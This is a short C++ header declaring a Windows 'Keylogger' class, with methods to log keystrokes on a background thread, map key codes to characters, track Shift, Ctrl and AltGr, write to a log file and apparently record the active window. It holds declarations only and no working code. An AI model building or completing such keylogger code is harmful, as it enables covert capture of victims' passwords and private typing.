#pragma once
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

class Keylogger {

public:

	Keylogger ();
	~Keylogger ();
	string getPath();
	void log();

	static DWORD WINAPI startLogging(PVOID pv);
	HANDLE startThread();

private:

	string key_to_char(int key);
	void update_controle_keys();

	bool Capital = false;
	bool Shift = false;
	bool AltGr = false;
	bool Ctrl = false;

	string ch;
	string tm;
	fstream LogFile;
	HWND h_for;
	HWND h_org = NULL;
};

